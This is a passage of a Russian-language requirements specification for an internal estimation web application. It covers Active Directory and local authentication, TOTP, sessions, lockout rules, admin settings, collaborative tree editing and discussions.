**FR-SA-02.** На шаге 5 в режиме AD администратор выбирается поиском по каталогу AD (ФИО или логин, FR-AUTH-AD-10) и заводится заранее, без ожидания его первого входа ([Решение Q-16]); поэтому мастер не может зайти в тупик «нет ни одного администратора». Пока не завершён мастер первичной настройки, приложение для всех остальных показывает страницу «Приложение настраивается» и не принимает вход никого, кроме суперадминистратора.

**FR-SA-03.** Суперадминистратор всегда аутентифицируется локально (логин + пароль приложения + TOTP), **даже если выбран режим AD**. **Почему:** если AD недоступен или настройки AD ошибочны, должен остаться способ войти и исправить настройки (break-glass). Если бы суперадминистратор входил через AD, ошибка в настройке LDAP заблокировала бы приложение для всех.

**FR-SA-04.** Для суперадминистратора второй фактор (TOTP) обязателен и не отключается. Для остальных ролей обязательность TOTP задаёт суперадминистратор переключателем на каждую роль (FR-2FA-02, [Решение Q-23]). По умолчанию TOTP обязателен для администраторов и для всех ролей, которые видят деньги; отключение пишется в аудит, оповещает ИБ (SEC-AUTH-07) и показывается красным предупреждением в интерфейсе.

**FR-SA-05.** Суперадминистратор может создать другого суперадминистратора. Действие требует повторного ввода пароля и кода TOTP (step-up). Суперадминистраторов от 2 до 3 (BR-ROLE-03, [Решение Q-07]). Создание суперадминистратора оповещает всех администраторов и ИБ (SEC-AUTH-07).

**FR-SA-06.** Админка суперадминистратора МОЖЕТ быть ограничена списком разрешённых сетей (CIDR). Ограничение действует на точные префиксы путей: страницы `/admin/system/` и всё под ним, API `/api/v1/system/` и всё под ним, вход суперадминистратора `/api/v1/auth/*` для логинов из списка зарезервированных (FR-AUTH-AD-12) и WebSocket-подключения сессий суперадминистратора. Если список задан, запросы из других сетей получают 404 (а не 403, чтобы не раскрывать существование раздела). Независимо от этого всё приложение доступно только из офисной сети и VPN, из интернета не публикуется (NFR-ENV-01, [Решение Q-35]).

**FR-SA-07.** Суперадминистратор видит раздел «Состояние системы»: версия приложения, версия схемы БД, доступность БД, Redis, SMTP, LDAP (зелёный/красный), очередь фоновых задач, дата последней резервной копии (из файла-метки, который пишет скрипт бэкапа).

### 7.2. Способ аутентификации

Суперадминистратор выбирает **один** режим для всех пользователей, кроме суперадминистраторов:

| Параметр | Режим «Приложение» | Режим «Active Directory» |
|---|---|---|
| Где хранится пароль | В БД приложения (хэш Argon2id) | В AD, приложение пароль не хранит |
| Кто создаёт пользователей | Администратор (суперадминистратор — только администраторов и суперадминистраторов) | Администратор находит человека в каталоге AD по ФИО и заводит заранее (FR-AUTH-AD-10) или пользователь создаётся при первом входе, если состоит в разрешённой группе AD |
| Смена и сброс пароля | В приложении, только одноразовой ссылкой (на почту или на экран администратору); временных паролей нет | В AD средствами компании, приложение не меняет пароль |
| Блокировка | В приложении | Отключение в AD блокирует вход и в течение 15 минут завершает открытые сессии (FR-AUTH-AD-08); также можно заблокировать в приложении |
| Роли | Выдаёт администратор | «Модератор» и «Пресейл» — вручную **или** по группам AD (настраивается); остальные роли — только вручную |
| ФИО, email | Вводит администратор | Берутся из AD при каждом входе |
| 2FA (TOTP) | Настраивается политикой по ролям | Настраивается политикой по ролям |
| Политика паролей | Политика приложения (FR-AUTH-LOC-02) | Политика паролей AD; настройки приложения не действуют |

#### Требования к режиму AD

**FR-AUTH-AD-01.** Параметры подключения: список контроллеров (host:port, перебираются по порядку при недоступности), протокол **LDAPS (636) или StartTLS (389)**, сертификат корневого УЦ компании (загрузка PEM), Base DN поиска пользователей, фильтр поиска (по умолчанию `(&(objectClass=user)(sAMAccountName={login}))`), атрибут логина (`sAMAccountName` или `userPrincipalName`), атрибуты ФИО и email, DN и пароль сервисной учётной записи, таймаут (по умолчанию 5 с).

**FR-AUTH-AD-02.** Нешифрованный LDAP (389 без StartTLS) **НЕ ДОЛЖЕН** быть доступен для выбора. Проверка сертификата сервера **НЕ ДОЛЖНА** отключаться. **Почему:** при простом LDAP пароли пользователей идут по сети открытым текстом.

**FR-AUTH-AD-03.** Кнопка «Проверить подключение» выполняет bind сервисной учёткой и поиск; кнопка «Проверить вход» принимает тестовые логин и пароль и показывает найденные атрибуты и группы (пароль нигде не сохраняется и не логируется). Сохранить настройки AD нельзя, пока обе проверки не прошли успешно хотя бы один раз после последнего изменения параметров.

**FR-AUTH-AD-04.** Пароль сервисной учётной записи хранится зашифрованным (см. SEC-CRYPT-03), в интерфейсе после сохранения не показывается (поле «••••••, изменить»).

**FR-AUTH-AD-05.** Доступ к приложению (подключается один домен AD, [Решение Q-19]; несколько доменов и лесов в MVP не поддерживаются): настраивается «Группа доступа» AD (одна или несколько). Пользователь, не состоящий ни в одной (с учётом вложенных групп через `LDAP_MATCHING_RULE_IN_CHAIN 1.2.840.113556.1.4.1941`), получает отказ «Нет доступа к приложению. Обратитесь к администратору» — без уточнения причины в интерфейсе, с причиной в аудите.

**FR-AUTH-AD-06.** JIT-провижининг: при первом успешном входе пользователь создаётся в приложении с системной ролью «Пользователь». Пользователь AD опознаётся по `objectGUID` (поле `ad_object_guid`), а не по логину: переименование логина в AD не создаёт дубль. При каждом входе обновляются логин, ФИО, email, статус учётки. Если учётка приложения с этим GUID была анонимизирована, создаётся новая учётка ([Решение Q-34]).

**FR-AUTH-AD-07.** Сопоставление групп AD ролям (опционально): таблица «группа AD → системная роль» только для ролей «Модератор» и «Пресейл» ([Решение Q-17]). Членство проверяется с учётом вложенных групп (`LDAP_MATCHING_RULE_IN_CHAIN`, как в FR-AUTH-AD-05); если пользователь входит в несколько групп ролей, роли суммируются. Если включено, эти роли пересчитываются при каждом входе и ежедневной синхронизации; ручная выдача этих двух ролей в интерфейсе для пользователей AD отключается (иначе источник истины неясен). Роли «Администратор», «Руководитель пресейла», «Аудитор ИБ» выдаются только вручную, «Суперадминистратор» через AD не выдаётся никогда. **Почему:** тот, кто управляет группой в AD, иначе получил бы административный доступ к приложению в обход его журнала.

**FR-AUTH-AD-08.** Отзыв доступа ([Решение Q-18]): каждые 15 минут фоновая задача проверяет в AD учётки пользователей, у которых есть активные сессии (существование по `objectGUID`, флаг `ACCOUNTDISABLE`, членство в группе доступа). Отключённые или удалённые из группы пользователи блокируются в приложении, их сессии завершаются, WebSocket закрывается. Кроме того, ежедневно в 03:00 (часовой пояс приложения) та же проверка выполняется для всех пользователей AD-режима и пересчитываются роли из групп. Если AD недоступен, проверка пропускается, сессии не трогаются, в «Состоянии системы» загорается предупреждение. Результаты — в аудит и в «Состояние системы».

**FR-AUTH-AD-09.** Если AD недоступен, пользователи AD войти не могут (сообщение «Сервис аутентификации временно недоступен»), уже открытые сессии продолжают работать до истечения. Суперадминистратор входит локально (FR-SA-03).

**FR-AUTH-AD-10.** Поиск в каталоге ([Решение Q-16]): администратор в разделе «Пользователи» нажимает «Найти в AD», вводит часть ФИО или логина (от 3 символов), видит до 50 записей из Base DN (ФИО, логин, email, подразделение) и заводит пользователя заранее: с ролями и назначением в проекты до первого входа. Поиск выполняется сервисной учёткой, ввод экранируется (FR-AUTH-AD-13). Пользователь, не состоящий в группе доступа, в выдаче помечается «нет в группе доступа» и не заводится.

**FR-AUTH-AD-11.** Kerberos/SSO в MVP нет ([Решение Q-05]). Модуль аутентификации реализуется как набор провайдеров с общим интерфейсом («проверить учётные данные → вернуть внешний идентификатор и атрибуты»), чтобы SPNEGO/Kerberos или OIDC добавлялся новым провайдером без изменения сессий, ролей и аудита.

**FR-AUTH-AD-12.** Логины суперадминистраторов зарезервированы. При входе система сначала проверяет, не принадлежит ли логин (без учёта регистра) суперадминистратору; если да, проверяется только локальный пароль и TOTP, к AD запрос не идёт. Пользователь AD с таким же логином войти не сможет, а суперадминистратор при создании получает предупреждение, если такой логин уже есть в AD.

**FR-AUTH-AD-13.** Безопасность обращения к LDAP: пустой пароль или логин отклоняются до обращения к AD (иначе bind с пустым паролем может пройти как анонимный); логин экранируется (`ldap3.utils.conv.escape_filter_chars`) перед подстановкой в фильтр; если поиск вернул не ровно одну запись, вход отклоняется. Сначала выполняется bind пользователем с введённым паролем, и только после успеха читаются группы и статус. Любой отказ (нет пользователя, неверный пароль, отключён, нет в группе) даёт пользователю один и тот же ответ «Неверный логин или пароль» за сопоставимое время; причина — только в аудите.

#### Требования к режиму «Приложение»

**FR-AUTH-LOC-01.** Пользователя создаёт администратор: логин (латиница, цифры, `.`, `-`, `_`, 3–64 символа, уникален без учёта регистра), ФИО, email (уникален), системные роли. Пароль администратор **не задаёт**: пользователю уходит письмо с одноразовой ссылкой установки пароля (срок 72 часа). Если SMTP не настроен — администратор получает одноразовую ссылку на экране и передаёт её сам.

**FR-AUTH-LOC-02.** Политика паролей ([Решение Q-24]; значения по умолчанию по NIST, меняет суперадминистратор): минимум 12 символов, максимум 128; проверка по списку из 100 000 распространённых паролей; запрет совпадения с логином, ФИО, email; история — нельзя повторять 5 последних; срок действия — не ограничен (по умолчанию) или N дней; требования к составу (заглавные, цифры, спецсимволы) — выключены по умолчанию, включаются; максимум одновременных сессий на пользователя — не ограничено по умолчанию или N (при превышении завершается самая старая). В режиме AD действует политика паролей AD, эти настройки к пользователям AD не применяются. **Почему по умолчанию длина важнее состава:** так рекомендует NIST SP 800-63B; правила состава приводят к паролям вида `Password1!`. Опция состава оставлена, потому что внутренние стандарты ИБ многих компаний её требуют.

**FR-AUTH-LOC-03.** «Забыли пароль»: пользователь вводит логин или email, ответ всегда одинаковый («Если такая учётная запись есть, мы отправили письмо») — чтобы нельзя было проверить существование логина. Ссылка действует 60 минут, одноразовая, после использования все сессии пользователя завершаются.

**FR-AUTH-LOC-04.** Смена пароля в профиле требует текущий пароль. После смены все остальные сессии пользователя завершаются.

#### Переключение режима

**FR-AUTH-SW-01.** Переключение режима ([Решение Q-20]): в интерфейсе возможен только переход «Приложение → AD». Его выполняет суперадминистратор с повторным вводом пароля и TOTP после экрана-предупреждения с последствиями. Обратный переход «AD → Приложение» выполняется только консольной командой `estimator auth-mode local` службой эксплуатации ИТ. Любое переключение оповещает всех администраторов и ИБ по старому каналу (SEC-AUTH-07).

| Переход | Что происходит с пользователями |
|---|---|
| Приложение → AD | Существующие пользователи сопоставляются с AD **только по логину** (без учёта регистра); сопоставления по email нет. Перед применением суперадминистратор видит отчёт (dry run) из трёх списков: «сопоставлено однозначно», «неоднозначно» (в AD найдено несколько кандидатов или логин совпадает, а ФИО нет) и «не найдено». Неоднозначные администратор подтверждает или отклоняет вручную по одному. Сопоставленные становятся AD-пользователями (записывается `ad_object_guid`), их локальные пароли, история паролей и ссылки установки пароля удаляются, TOTP сохраняется. Несопоставленные блокируются с причиной «нет в AD» |
| AD → Приложение (только консоль) | Все пользователи становятся локальными без пароля; каждому отправляется ссылка установки пароля (72 часа). До установки пароля вход невозможен. Сопоставление групп с ролями отключается, выданные из групп роли остаются как ручные |

Во всех случаях все сессии, кроме сессии суперадминистратора, завершаются; назначения в проекты, роли и TOTP пользователей сохраняются; отчёт о переключении сохраняется в аудит. Данные проектов, авторство и история не меняются: они ссылаются на внутренний `user_id`, а не на логин.

### 7.3. Сессии и второй фактор

**FR-SESS-01.** Сессия — серверная (запись в Redis с копией метаданных в БД), идентификатор — 256 бит случайных данных в cookie `__Host-session` с флагами `HttpOnly; Secure; SameSite=Strict; Path=/`. JWT в localStorage не используется. **Почему:** серверную сессию можно мгновенно отозвать (блокировка пользователя, смена роли), а токен в localStorage крадётся любым XSS.

**FR-SESS-02.** Таймауты (по умолчанию, меняет суперадминистратор): бездействие — 60 минут для пользователей, 15 минут для администраторов и суперадминистраторов; абсолютный срок — 12 часов. За 2 минуты до истечения по бездействию показывается диалог «Продлить сессию?». Активностью считаются только REST-запросы, вызванные действиями пользователя; heartbeat WebSocket, фоновые опросы и продление блокировок ячеек активность не продлевают (запросы такого рода помечаются заголовком `X-Background: 1`). При истечении или отзыве сессии сервер закрывает её WebSocket не позже чем через 5 секунд.

**FR-SESS-03.** Идентификатор сессии меняется при входе и при прохождении TOTP (защита от фиксации сессии).

**FR-SESS-04.** В профиле пользователь видит свои активные сессии (браузер, IP, время входа, последняя активность) и может завершить любую или все, кроме текущей.

**FR-SESS-05.** Блокировка пользователя, изменение его системных ролей, смена пароля, исключение из проекта — действуют на открытые сессии не позже чем через 5 секунд (проверка прав выполняется на каждом запросе по актуальным данным; WebSocket получает событие отзыва и переподключается с новой проверкой прав либо закрывается).

**FR-2FA-01.** TOTP по RFC 6238 (30 с, 6 цифр, SHA-1 для совместимости с Google Authenticator, Яндекс Ключ, FreeOTP, Microsoft Authenticator). При подключении показывается QR-код и секрет текстом, пользователь подтверждает первым кодом. Выдаются 10 одноразовых резервных кодов (хранятся как хэши). Принимается код текущего шага и ±1 соседнего (допуск рассинхронизации часов ±30 с). Каждый принятый код запоминается до конца окна; повторное использование того же кода отклоняется (защита от повторного воспроизведения).

**FR-2FA-02.** Политика 2FA задаётся суперадминистратором по каждой роли: «по желанию» или «обязательно» ([Решение Q-23]). По умолчанию «обязательно» для администраторов, руководителя пресейла, аудитора ИБ, а также для всех, кто в каком-либо проекте является модератором или пресейлом (то есть видит деньги); «по желанию» — для остальных. Для суперадминистратора всегда «обязательно».

**FR-2FA-04.** Принудительное подключение: если для пользователя TOTP обязателен, а он не подключён, после ввода пароля он попадает на экран подключения TOTP (QR-код, секрет, подтверждение первым кодом, резервные коды). До подключения ему недоступны любые другие страницы и API, кроме выхода; сессия до подключения ограничена 15 минутами. Если обязательность включили, пока пользователь в системе, требование применяется при его следующем входе.

**FR-2FA-03.** Сброс 2FA пользователю делает администратор (для пользователей) или суперадминистратор (для администраторов), с записью в аудит. Пароль и TOTP суперадминистратора сбрасывает в интерфейсе другой суперадминистратор (с step-up); если доступ потеряли все суперадминистраторы, служба эксплуатации ИТ выполняет консольную команду `estimator reset-superadmin --login <login>`, которая выдаёт одноразовую ссылку ([Решение Q-22]). Любой сброс оповещает ИБ (SEC-AUTH-07).

### 7.4. Блокировки при подборе пароля

**FR-LOCK-01.** После 5 неудачных попыток входа подряд для одного логина учётная запись блокируется на 15 минут (значения меняет суперадминистратор). Счётчик сбрасывается после успешного входа (пароль и TOTP) и по истечении блокировки. В режиме AD приложение блокирует вход у себя, не дожидаясь блокировки в AD. Сообщение пользователю одинаковое для неверного логина и неверного пароля: «Неверный логин или пароль».

**FR-LOCK-02.** Ограничение частоты с одного IP: не более 20 попыток входа в минуту, затем ответ 429 на 5 минут.

**FR-LOCK-03.** Неудачный TOTP считается неудачной попыткой входа.

**FR-LOCK-04.** Логины суперадминистраторов не блокируются ([Решение Q-21]): иначе злоумышленник мог бы запереть всех суперадминистраторов. Вместо блокировки действует растущая задержка ответа для IP-адреса источника (1, 2, 4, 8 … до 60 с после каждой неудачи), а после 5 неудач подряд по логину суперадминистратора ИБ и все суперадминистраторы получают оповещение (SEC-AUTH-07).

**FR-LOCK-05.** На форме входа кнопка «Войти» неактивна, пока пустое хотя бы одно поле. Сколько попыток осталось до блокировки, пользователю не сообщается (это помогало бы подбору); после блокировки показывается «Слишком много попыток, повторите через 15 минут».

### 7.5. Админка администратора

Разделы (каждый — таблица со списком, поиском и формой справа):

| Раздел | Поля | Особые правила |
|---|---|---|
| Пользователи | ФИО, логин, email, источник (локальный/AD), системные роли, статус, последний вход, 2FA | Пользователя нельзя удалить, только заблокировать. Блокировка не убирает его из проектов, но он перестаёт получать уведомления. Анонимизация — см. SEC-PD-03 |
| Фазы | Название, порядок, признак «сквозная (процент)», активна | Ровно одна фаза может быть сквозной. Фазу, используемую в проектах, нельзя удалить, можно сделать неактивной (не предлагается в новых проектах) |
| Дисциплины | Название, короткое название (для заголовков, ≤ 12 символов), цвет, профиль по умолчанию, активна | Ставок здесь нет: ставки задаются в проекте (BR-MONEY-02) |
| Типы узлов | Название, иконка, нормы (список «вариант — O/R/P»), активен | «Работа» нельзя удалить или отключить: это тип по умолчанию |
| Предложенные типы | Локальные типы из проектов, проект, автор | Добавить / объединить / отклонить |
| Профили дисциплин | Дисциплина, название профиля, цепочка типов | У каждой дисциплины один профиль по умолчанию |
| Пороги и проценты | Порог «крупного листа» для Средне/Детально, ожидаемое число единиц для Средне, % УП по умолчанию, срок автоархивации (по умолчанию 180 дней после «Завершена», 0 — выключено, [Решение Q-13]) | Значения влияют только на новые проекты (кроме порогов подсказок — сразу на все) |
| Контрольные соотношения | Дисциплина A, набор дисциплин B, мин %, макс % | |
| Метки комментариев | Название, короткое имя, цвет, куда идёт в статистике (Допущения / Риски / Технологии / Ограничения) | |
| Валюты | Код ISO 4217, символ, активна | RUB неудаляема |
| Реестр проектов | Название, заказчик, модераторы, статус, даты, признак «без модератора» | Без денег. Действия «Передать / добавить модератора», «Открыть в режиме поддержки» (FR-ADM-06). Отдельный фильтр «Проекты без модератора» (BR-PRJ-07) |
| Производственный календарь | Год, список нерабочих и перенесённых рабочих дней | Администратор загружает календарь РФ на год (CSV или вручную). Если на год календаря нет, используется Пн–Пт ([Решение Q-43]) |
| Причины проигрыша | Название, активна | Для «Результата пресейла» (BR-PRJ-05) |
| Ставки НДС | Название, процент, активна | «Без НДС» неудаляема (BR-MONEY-05) |

**BR-ADM-03.** Администратор не видит ставки, стоимость и валюты проектов (кроме справочника валют), в том числе в режиме поддержки. Если администратор назначен в проект участником (в том числе сам себя), он видит деньги как участник этого проекта; такое назначение пишется в аудит с пометкой «администратор назначил себя / свою учётку» ([Решение Q-25]).

**FR-ADM-05.** «Заменить участника» ([Решение Q-29]): администратор выбирает пользователя (обычно заблокированного) и замену, видит список всех активных проектов, где тот участвует, с ролями и дисциплинами, снимает отметки с ненужных и подтверждает. Замена получает те же проектные роли, исходный пользователь исключается из этих проектов; авторство прежних правок не меняется. Модераторы затронутых проектов получают уведомление; действие пишется в аудит. Кроме того, модератор проекта видит в команде предупреждение «участник заблокирован» и может заменить его сам.

**FR-ADM-06.** Режим поддержки ([Решение Q-15]): администратор открывает проект из реестра кнопкой «Открыть в режиме поддержки», обязательно вводит причину (10–500 символов). Проект открывается только на чтение, без денег и без закрытых заметок, с жёлтой полосой «Режим поддержки». Сессия режима поддержки по проекту длится не более 60 минут. Открытие пишется в аудит с причиной, модераторы проекта получают уведомление «Администратор открыл проект в режиме поддержки: <причина>».

**BR-ADM-01.** Любое изменение справочника пишется в журнал аудита со значением «было → стало».

**BR-ADM-02.** Изменение справочника не меняет задним числом снимки: снимок хранит денормализованные названия фаз, дисциплин и типов на момент снимка.

### 8.2. «Мои оценки» (главная)

**FR-HOME-01.** Список проектов, где пользователь участвует в любой проектной роли. Колонки: название, заказчик, статус проекта, моя роль и мои дисциплины, мой прогресс (сколько моих веток «готово» из всех моих), дедлайн (красный, если осталось ≤ 2 рабочих дня по производственному календарю, BR-PRJ-08, и мои ветки не готовы), счётчик «вопросы мне», дата последнего изменения.

**FR-HOME-02.** Сортировка по умолчанию: сначала проекты с вопросами мне, затем по дедлайну по возрастанию. Фильтры: статус (по умолчанию все, кроме «Архив»; архивные проекты видны текущим участникам по фильтру «Архив», [Решение Q-44]), роль, поиск по названию и заказчику.

**FR-HOME-03.** Кнопка «Создать проект» видна только пользователям с системной ролью «Модератор».

**FR-HOME-04.** Колонка «Итог»: всем участникам — «Цифра для КП» в часах (E, P80 или P90 по настройке проекта, BR-MONEY-06). Модератор и пресейл проекта дополнительно видят сумму без НДС в валюте КП. Сумма берётся из кэша итогов проекта (`project_totals`, ARCH-03), который хранит и часы, и деньги; сервер включает денежные поля в ответ только для проектов, где у пользователя есть право `money.read` (SEC-AUTHZ-05). Руководитель пресейла видит все проекты с деньгами в реестре (раздел 10.4), а не в «Моих оценках».

**FR-PRJ-02.** «Копировать проект» (модератор): создаёт новый проект в статусе «Подготовка» с настройками, командой и деревом (без обсуждений, истории, снимков, отметок «Проверено»; статусы веток — «черновик»). Ставки копируются только если копирует модератор исходного проекта.

**FR-PRJ-03.** «Копировать ветку из другого проекта» (эксперт и модератор): в своей ветке эксперт выбирает проект, где он **сейчас** является участником и который ему виден (в том числе архивный, [Решение Q-44]), и ветку той же дисциплины; из проектов, откуда его исключили, копировать нельзя (BR-ROLE-06); поддерево копируется как дочерние узлы выбранного узла. Копируются названия, типы, O/R/P, ×N, комментарии. Перед копированием проверяются лимиты BR-TREE-05/06; при превышении копирование отклоняется целиком. **Почему ограничение «где участник»:** иначе эксперт увидит оценки чужих проектов, к которым у него нет доступа.

**FR-PRJ-04.** Ветки дисциплины создаются только кнопкой модератора «Добавить дисциплину» (в настройках или в команде) — во всех включённых фазах, со статусом «не начато». Назначение эксперта на дисциплину, которой ещё нет в проекте, сначала добавляет дисциплину тем же действием. Снятие последнего эксперта с дисциплины не удаляет ветки: они остаются и показываются с пометкой «нет эксперта».

**FR-DOC-01.** Документы заказчика ([Решение Q-09]): вкладка проекта со списком файлов (название, кто и когда загрузил, размер). Форматы — PDF, DOCX, XLSX; размер файла — до 50 МБ; всего на проект — до 1 ГБ. Загружают и удаляют модератор и пресейл проекта, скачивают все участники. Тип файла проверяется по содержимому, а не по расширению; каждый файл проверяется антивирусом (ClamAV) до того, как станет доступен; файлы хранятся зашифрованными (SEC-CRYPT-06). Удалённый документ уходит в корзину проекта на 30 дней. В обсуждениях файлы не прикладываются: только ссылка на документ из этой вкладки. Скачивание пишется в аудит.

**FR-NOTE-01.** Закрытые заметки ([Решение Q-03]): у проекта и у каждого узла есть вкладка «Заметки» для модераторов, пресейла и руководителя пресейла (например, «заказчик торгуется, держим P80»). Эксперты и ревьюеры не видят ни заметок, ни их счётчика, сервер не отдаёт их в API. Заметки не попадают в экспорт и снимки. Сами обсуждения видны всем участникам.

**BR-PRJ-08.** Рабочие дни (для подсветки дедлайна и «просрочено» в статистике) считаются по производственному календарю РФ, загруженному администратором; если на год календаря нет — Пн–Пт ([Решение Q-43]).

Один экран для всех ролей. Различаются только права на редактирование и деньги в верхней полосе (макет — раздел 11.4).

**FR-TREE-10.** Столбцы:

**FR-TREE-12.** Над деревом: поиск по названию и комментарию (от 2 символов, подсветка совпадений), чипы-фильтры «Мои ветки», «Без оценки» (пустые и неверные листья, BR-CALC-02), «Крупные», «Без „Проверено“», «С открытыми вопросами», кнопки «До фаз», «До дисциплин», «Всё раскрыть». Фильтр оставляет найденные строки вместе с родителями; итоги в верхней полосе всегда по всему проекту.

**FR-TREE-13.** Строки фазы и дисциплины прилипают сверху, пока прокручиваются их листья. Шапка столбцов закреплена. Отступ уровня 16 px, после 5-го уровня отступ не растёт (глубина показывается цифрой у иконки).

**FR-TREE-14.** Состояние раскрытия, фильтры и ширина столбцов запоминаются для пользователя и проекта (на сервере, таблица `user_view_state`, чтобы работало с другого компьютера).

**FR-TREE-15.** Виртуализация строк: в DOM одновременно не более ~150 строк независимо от размера дерева.

#### Редактирование

**FR-TREE-20.** Ввод в ячейку: клик → поле ввода → Enter или уход фокуса сохраняет; Esc отменяет. Tab переходит O → R → P → Комментарий → O следующего листа. Сохранение происходит на лету, кнопки «Сохранить» нет. Пока запрос не подтверждён сервером, у ячейки индикатор «сохраняется»; при ошибке — красная рамка и текст ошибки, введённое значение не теряется.

**FR-TREE-21.** Ввод O/R/P: разделитель — запятая или точка; шаг 0,5 (значение округляется до 0,5 с подсказкой «округлено до 12,5»); допустим быстрый ввод вилки в поле O строкой `8-12-20` или `8/12/20` — значения распределяются по трём полям.

**FR-TREE-22.** Валидация O ≤ R ≤ P не мешает сохранить (черновик), но строка подсвечивается красным, лист не входит в суммы (BR-CALC-02).

**FR-TREE-23.** Кнопка «+» у строки: «Лист рядом», «Дочерний узел» (для листа — означает «Разбить», с подтверждением). Контекстное меню (правая кнопка или «⋯»): «Сменить тип», «Разбить на части», «Свернуть в лист», «Переместить в…» (диалог выбора узла в пределах ветки; модератору — в пределах проекта), «Вверх/вниз», «Дублировать», «История», «Удалить». Перетаскивание мышью СЛЕДУЕТ поддержать для изменения порядка внутри родителя.

**FR-TREE-24.** Удаление узла переносит его со всем поддеревом в корзину проекта. Подтверждение требуется, если у узла есть дети или открытые обсуждения. Корзина: модератор видит всё, эксперт — удалённое из своих веток; «Восстановить» возвращает на прежнее место (если родитель тоже удалён — восстанавливается вместе с ним). Удалённое хранится в корзине 30 дней с момента удаления, затем удаляется ночной задачей окончательно ([Решение Q-04]); за 3 дня до этого элемент помечается «будет удалён через N дн.». Восстановление проверяет лимиты BR-TREE-05/06. Если место восстановления недоступно (фаза выключена в проекте, ветка в статусе «не нужно», дисциплина удалена из проекта), система предлагает выбрать другой узел в пределах той же дисциплины; восстановление в ветку «готово» возвращает её в «черновик» (BR-BR-02).

**FR-TREE-25.** Ctrl+Z нет. История листа (кнопка «История» или клик по значку времени): список «кто, когда, поле, было → стало»; у каждого значения кнопка «Вернуть это значение». **Почему нет Ctrl+Z:** при совместной работе непонятно, чью правку отменяет Ctrl+Z, а история с явным выбором значения однозначна.

#### Совместная работа

**FR-TREE-30.** Правки других участников появляются без перезагрузки за ≤ 1 секунду (NFR-PERF-04). Изменённая ячейка на 2 секунды подсвечивается, у строки на 10 секунд появляется метка с инициалами автора.

**FR-TREE-31.** Захват ячейки: когда пользователь начинает ввод в ячейку, сервер выдаёт ему «захват» этой ячейки (узел + поле) на 30 секунд, продлеваемый каждые 10 с, пока поле в фокусе. Другие видят у ячейки рамку цвета пользователя и его инициалы; поле у них не переходит в режим ввода, а показывает подсказку «Сейчас редактирует И. Иванов». Сервер **проверяет** захват: PATCH этого поля от другого пользователя отклоняется с кодом 423 `CELL_LOCKED`. Модератор может перехватить ячейку («Всё равно править»); прежний владелец получает уведомление, его несохранённый ввод остаётся в поле до конфликта по FR-TREE-32. Захват снимается при сохранении, Esc, уходе фокуса, закрытии WebSocket владельца или по истечении 30 с без продления. Остальные ячейки той же строки свободны.

**FR-TREE-32.** Защита от потери данных при гонке: каждое изменение отправляется с номером версии узла, известной клиенту. Если сервер видит, что **это же поле** изменилось после указанной версии, правка отклоняется (409), клиент показывает «Значение изменил П. Петров: 16. Ваше: 18. [Оставить моё] [Принять]». Изменения разных полей одного узла не конфликтуют.

```mermaid
sequenceDiagram
    participant A as Эксперт А
    participant S as Сервер
    participant B as Эксперт Б
    A->>S: lock(node 42, field R)
    S-->>B: событие: R узла 42 занято А
    A->>S: PATCH node 42 {R: 16, base_version: 7}
    S->>S: версия 7 = текущая → применить, версия 8
    S-->>A: 200 {version: 8, E, σ, суммы предков}
    S-->>B: событие node.updated {42, R=16, v8, автор А}
    B->>S: PATCH node 42 {P: 30, base_version: 7}
    S->>S: P не менялось после v7 → применить, версия 9
    S-->>A: событие node.updated {42, P=30, v9, автор Б}
```

**FR-TREE-33.** Потеря соединения: при разрыве WebSocket показывается жёлтая полоса «Нет связи, правки не сохраняются», поля ввода становятся только для чтения. После восстановления клиент запрашивает изменения с последней известной версии проекта (`GET /projects/{id}/changes?since=`) и применяет их. **Почему не очередь офлайн-правок:** офлайн-правки при совместной работе почти всегда дают конфликты, которые пользователю трудно понять; честнее не дать вводить.

**FR-TREE-34.** Правка модератором листа чужой дисциплины: сохраняется сразу (это и есть «изменения модератора» из раздела 1.1); в историю пишется автор-модератор; в ленту обсуждения листа добавляется событие; эксперты дисциплины получают счётчик «Изменения модератора» (не путать с вопросами); отметка «Проверено» снимается; статус ветки «готово» → «черновик» (BR-BR-02).

### 8.5. Ревью

**FR-REV-01.** Ревьюер дисциплины и модератор ставят «Проверено» листу или узлу (тогда отмечаются все листья поддерева). Отметка хранит автора и время.

**FR-REV-02.** Любая правка O/R/P, ×N, переноса листа снимает отметку с листа и с узлов-предков. Правка комментария — не снимает.

**FR-REV-03.** В статистике по каждой дисциплине: доля часов (E) с отметкой «Проверено», отдельно — доля «самопроверки».

**FR-REV-04.** Самопроверка ([Решение Q-33]): если ревьюер ставит «Проверено» на лист, у которого он автор последнего изменения O/R/P/×N, отметка сохраняется с признаком `self_review` и показывается значком ◐ с подсказкой «самопроверка». В статистике самопроверенные часы считаются проверенными, но показываются отдельной цифрой; модератор может отфильтровать их в дереве. Отметка модератора самопроверкой не считается.

## 9. Обсуждения, вопросы заказчику, уведомления

### 9.1. Комментарий листа и обсуждение — в чём разница

| | Комментарий | Обсуждение |
|---|---|---|
| Назначение | Описывает сам лист: ограничения, технологии, риски, допущения | Вопросы и переписка |
| Где | Ячейка в строке, виден всегда | Раскрывается под строкой |
| Сколько | Один на узел | Лента сообщений |
| Кто пишет | Эксперты дисциплины, модератор | Любой участник проекта |
| Куда попадает | По меткам — в списки статистики и в экспорт (допущения, риски) | В счётчики, в список вопросов заказчику |

### 9.2. Требования к обсуждениям

**FR-DISC-01.** Обсуждение есть у любого узла: листа, узла, ветки дисциплины, фазы, а также у проекта целиком (в шапке; в модели данных у таких сообщений `node_id = NULL`).

**FR-DISC-02.** Сообщение: обычный текст 1–4 000 символов (ответ заказчика — до 10 000 символов), переводы строк, автоссылки на `http(s)://`. HTML и Markdown **не интерпретируются** (SEC-WEB-02).

**FR-DISC-03.** Флаг «нужен ответ» делает сообщение открытым вопросом. Адресат указывается через @ с автодополнением: `@Бэкенд` (все эксперты дисциплины), `@Иван Петров` (участник проекта), `@модератор` (все модераторы), `@заказчик`. Можно несколько адресатов. Если флаг стоит, а адресата нет: для узлов внутри ветки — эксперты этой дисциплины, для фазы и проекта — модераторы.

**FR-DISC-04.** В свёрнутом виде у строки значок 💬 со счётчиком сообщений; если есть открытый вопрос — значок оранжевый, если вопрос мне — с красной точкой. В раскрытом виде — последние 3 сообщения, кнопка «Показать всё (N)», поле ввода; Ctrl+Enter отправляет.

**FR-DISC-09.** Модель вопроса: сообщение с флагом «нужен ответ» открывает **вопрос** (сущность `threads`), а ответы на него ссылаются на этот вопрос. В одном узле может быть несколько открытых вопросов одновременно; «Решено» закрывает конкретный вопрос, а не всю ленту узла. Сообщения без флага — обычная лента узла без статуса.

